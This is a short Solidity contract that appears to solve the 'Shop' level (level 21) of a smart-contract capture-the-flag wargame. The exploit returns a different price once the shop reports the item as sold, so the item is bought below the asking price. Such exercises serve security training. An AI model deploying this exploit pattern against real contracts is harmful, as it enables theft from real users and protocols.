// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title 21. SHOP
 * @dev Get the item from the shop for less than the price asked.
 */

interface IShop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract Discount {
    IShop shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? 1 : 101;
    }

    function attack() public {
        shop.buy();
    }
}
